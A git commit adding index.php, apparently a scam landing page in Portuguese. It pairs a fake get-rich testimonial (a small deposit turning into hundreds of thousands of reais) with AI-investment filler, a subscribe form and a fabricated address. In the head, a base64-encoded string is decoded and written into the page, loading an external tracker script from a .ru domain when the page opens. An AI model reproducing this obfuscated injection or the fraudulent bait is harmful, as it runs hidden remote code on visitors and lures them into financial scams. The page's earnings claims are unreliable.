0af86847efb0ed216149ddee85311c9023500ab2
vndytxkh <76050555+vndytxkh@users.noreply.github.com>
2020-12-15 15:02:32 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Caros amigos, a estrutura e o local de treinamento nos per</title>
+    <meta property="og:type"               content="article" />
+    <meta property="og:title"              content=" " />
+    <meta property="og:description"        content=""𝐑𝐞𝐜𝐞𝐧𝐭𝐞𝐦𝐞𝐧𝐭𝐞 𝐦𝐞 𝐫𝐞𝐠𝐢𝐬𝐭𝐫𝐞𝐢 𝐧𝐞𝐬𝐭𝐞 𝐬𝐢𝐭𝐞, 𝐞 𝐚𝐠𝐨𝐫𝐚 𝐫𝐞𝐭𝐢𝐫𝐞𝐢 𝐦𝐚𝐢𝐬 𝐝𝐞 R̲$̲𝟾𝟶𝟶 𝚖𝚒𝚕! 𝐀𝐩𝐨́𝐬 𝐨 𝐫𝐞𝐠𝐢𝐬𝐭𝐫𝐨, 𝐮𝐦 𝐜𝐨𝐧𝐬𝐮𝐥𝐭𝐨𝐫 𝐦𝐞 𝐥𝐢𝐠𝐨𝐮 𝐞 𝐦𝐞 𝐜𝐨𝐧𝐭𝐨𝐮 𝐜𝐨𝐦𝐨 𝐟𝐮𝐧𝐜𝐢𝐨𝐧𝐚 𝐨 𝐬𝐢𝐬𝐭𝐞𝐦𝐚. 𝐃𝐞𝐩𝐨𝐬𝐢𝐭𝐞𝐢 𝐚𝐩𝐞𝐧𝐚𝐬 R̲$̲𝟷.𝟸𝟻𝟶 𝐞𝐦 𝐦𝐢𝐧𝐡𝐚 𝐜𝐨𝐧𝐭𝐚. 𝐓𝐫𝐞̂𝐬 𝐝𝐢𝐚𝐬 𝐝𝐞𝐩𝐨𝐢𝐬, 𝐞𝐮 𝐣𝐚́ 𝐭𝐢𝐧𝐡𝐚 𝐮𝐦 𝐦𝐢𝐥𝐡𝐚̃𝐨 𝐞𝐦 𝐦𝐞𝐮 𝐬𝐚𝐥𝐝𝐨 𝐞 𝐮𝐦 𝐦𝐞̂𝐬 𝐝𝐞𝐩𝐨𝐢𝐬 - 𝐦𝐚𝐢𝐬 𝐝𝐞 R̲$̲𝟾𝟶𝟶.𝟶𝟶𝟶! 𝐃𝐞𝐬𝐜𝐮𝐥𝐩𝐞, 𝐧𝐚̃𝐨 𝐩𝐮𝐝𝐞 𝐟𝐚𝐥𝐚𝐫 𝐬𝐨𝐛𝐫𝐞 𝐞𝐬𝐭𝐞 𝐬𝐢𝐭𝐞 𝐚𝐧𝐭𝐞𝐬 𝐩𝐨𝐫𝐪𝐮𝐞 𝐨 𝐫𝐞𝐠𝐢𝐬𝐭𝐫𝐨 𝐟𝐨𝐢 𝐞𝐧𝐜𝐞𝐫𝐫𝐚𝐝𝐨. 𝐌𝐚𝐬 𝐡𝐨𝐣𝐞 𝐞𝐥𝐞𝐬 𝐫𝐞𝐚𝐛𝐫𝐢𝐫𝐚𝐦, 𝐧𝐚̃𝐨 𝐬𝐞𝐢 𝐪𝐮𝐚𝐧𝐭𝐨 𝐭𝐞𝐦𝐩𝐨 𝐯𝐚𝐢 𝐟𝐢𝐜𝐚𝐫 𝐚𝐛𝐞𝐫𝐭𝐨, 𝐞𝐧𝐭𝐚̃𝐨 𝐬𝐞 𝐚𝐩𝐫𝐞𝐬𝐬𝐞, 𝐨 𝐜𝐨𝐧𝐬𝐮𝐥𝐭𝐨𝐫 𝐯𝐚𝐢 𝐭𝐞 𝐥𝐢𝐠𝐚𝐫 𝐞 𝐜𝐨𝐧𝐭𝐚𝐫 𝐭𝐮𝐝𝐨."" />
+    <meta property="og:image"              content="8.jpg">
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl92Z2o1aWtrMW0yN2IiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header>
+		<nav>
+			<li><a href="#">Home</a></li>
+			<li><a href="#">Products</a></li>
+			<li><a href="#">About</a></li>
+			<li><a href="#">Contacts</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>Caros amigos, a estrutura e o local de treinamento nos per</h1>
+	</section>
+
+
+
+
+
+
+
+	<section class="our-work" >
+<p>"𝐑𝐞𝐜𝐞𝐧𝐭𝐞𝐦𝐞𝐧𝐭𝐞 𝐦𝐞 𝐫𝐞𝐠𝐢𝐬𝐭𝐫𝐞𝐢 𝐧𝐞𝐬𝐭𝐞 𝐬𝐢𝐭𝐞, 𝐞 𝐚𝐠𝐨𝐫𝐚 𝐫𝐞𝐭𝐢𝐫𝐞𝐢 𝐦𝐚𝐢𝐬 𝐝𝐞 R̲$̲𝟾𝟶𝟶 𝚖𝚒𝚕! 𝐀𝐩𝐨́𝐬 𝐨 𝐫𝐞𝐠𝐢𝐬𝐭𝐫𝐨, 𝐮𝐦 𝐜𝐨𝐧𝐬𝐮𝐥𝐭𝐨𝐫 𝐦𝐞 𝐥𝐢𝐠𝐨𝐮 𝐞 𝐦𝐞 𝐜𝐨𝐧𝐭𝐨𝐮 𝐜𝐨𝐦𝐨 𝐟𝐮𝐧𝐜𝐢𝐨𝐧𝐚 𝐨 𝐬𝐢𝐬𝐭𝐞𝐦𝐚. 𝐃𝐞𝐩𝐨𝐬𝐢𝐭𝐞𝐢 𝐚𝐩𝐞𝐧𝐚𝐬 R̲$̲𝟷.𝟸𝟻𝟶 𝐞𝐦 𝐦𝐢𝐧𝐡𝐚 𝐜𝐨𝐧𝐭𝐚. 𝐓𝐫𝐞̂𝐬 𝐝𝐢𝐚𝐬 𝐝𝐞𝐩𝐨𝐢𝐬, 𝐞𝐮 𝐣𝐚́ 𝐭𝐢𝐧𝐡𝐚 𝐮𝐦 𝐦𝐢𝐥𝐡𝐚̃𝐨 𝐞𝐦 𝐦𝐞𝐮 𝐬𝐚𝐥𝐝𝐨 𝐞 𝐮𝐦 𝐦𝐞̂𝐬 𝐝𝐞𝐩𝐨𝐢𝐬 - 𝐦𝐚𝐢𝐬 𝐝𝐞 R̲$̲𝟾𝟶𝟶.𝟶𝟶𝟶! 𝐃𝐞𝐬𝐜𝐮𝐥𝐩𝐞, 𝐧𝐚̃𝐨 𝐩𝐮𝐝𝐞 𝐟𝐚𝐥𝐚𝐫 𝐬𝐨𝐛𝐫𝐞 𝐞𝐬𝐭𝐞 𝐬𝐢𝐭𝐞 𝐚𝐧𝐭𝐞𝐬 𝐩𝐨𝐫𝐪𝐮𝐞 𝐨 𝐫𝐞𝐠𝐢𝐬𝐭𝐫𝐨 𝐟𝐨𝐢 𝐞𝐧𝐜𝐞𝐫𝐫𝐚𝐝𝐨. 𝐌𝐚𝐬 𝐡𝐨𝐣𝐞 𝐞𝐥𝐞𝐬 𝐫𝐞𝐚𝐛𝐫𝐢𝐫𝐚𝐦, 𝐧𝐚̃𝐨 𝐬𝐞𝐢 𝐪𝐮𝐚𝐧𝐭𝐨 𝐭𝐞𝐦𝐩𝐨 𝐯𝐚𝐢 𝐟𝐢𝐜𝐚𝐫 𝐚𝐛𝐞𝐫𝐭𝐨, 𝐞𝐧𝐭𝐚̃𝐨 𝐬𝐞 𝐚𝐩𝐫𝐞𝐬𝐬𝐞, 𝐨 𝐜𝐨𝐧𝐬𝐮𝐥𝐭𝐨𝐫 𝐯𝐚𝐢 𝐭𝐞 𝐥𝐢𝐠𝐚𝐫 𝐞 𝐜𝐨𝐧𝐭𝐚𝐫 𝐭𝐮𝐝𝐨."</p>
+		<hr>
+		<img src="8.jpg"/>
+<p>Após 60 anos, o interesse pela inteligência artificial (IA) foi reativado. Ultimamente, tem havido muitos avanços científicos incríveis em IA. Talvez o mais barulhento deles tenha sido a vitória do AlphaGo do DeepMind sobre um dos jogadores de go mais fortes.<br><br>
+
+Além disso, as tecnologias de inteligência artificial estão cada vez mais sendo usadas na prática. Eles há muito foram adaptados para resolver problemas de negócios. Mas agora o fenômeno da IA   está se abrindo para um público de massa. Serviços baseados em redes neurais entram na vida de pessoas comuns e recebem um enorme efeito viral.<br><br>
+
+Você não precisa ir longe para obter exemplos - basta lembrar o recente sucesso dos projetos domésticos Prisma e Findface, bem como da startup bielorrussa MSQRD.<br><br>
+
+Tudo isso se tornou possível graças ao crescimento do desempenho do computador, ao rápido acúmulo de dados digitais (e este é o principal livro de IA) e ao desenvolvimento do aprendizado de máquina.<br><br>
+
+De acordo com a CB Insights, os investimentos em IA estão quebrando todos os recordes hoje. Nos últimos 5 anos, o número de transações nesta área cresceu de 67 para 397, o montante total de financiamento para startups de IA - de $ 282 milhões para $ 2,4 bilhões.<br><br>
+
+Desde o início de 2016, mais de 200 desenvolvedores de sistemas de inteligência artificial atraíram investimentos (no valor total de cerca de US $ 1,5 bilhão). Os desenvolvimentos internos de IA são conduzidos pela IBM, Google, Facebook, Apple, Samsung, Amazon e Microsoft. Gigantes de TI estão comprando startups em lotes que possuem desenvolvimentos baseados em redes neurais.<br><br>
+
+Siga minha orientação e invista em grandes empresas:</p><br><br>
+<a href="https://www.jpmorganchase.com/" >jpmorganchase.com</a><br><br>
+<a href="https://tdameritrade.com/" >tdameritrade.com</a><br><br>
+	</section>
+
+
+
+
+
+
+
+	<section class="contact">
+		<h3 class="title">Entretanto, não se deve esquecer que o início do trabalho diári</h3>	
+		<p>Assim, o desenvolvimento posterior de várias formas de atividade permite realizar as tarefas mais importantes de desenvolvimento das posições assumidas pelos participantes em relação às tarefas definidas. Caros amigos, a estrutura estabelecida da organização contribui para a relevância das condições financeiras e administrativas existentes. Entretanto, não se deve esquecer que o início do trabalho diário de formação da posição depende diretamente de uma inovação bem equilibrada! Caros amigos, o escopo e o local de aprendizagem desempenham um papel importante na formação da viabilidade econômica das decisões.</p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="Email">
+			<input type="Name" placeholder="Name">
+			<input type="Surmane" placeholder="Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer>
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>33016 Margret Crest, Apt. 288, 25339, West Minerva, Connecticut, United States</p>
+	</footer>
+
+
+
+
+
+
+
+</body>
+
+</html>
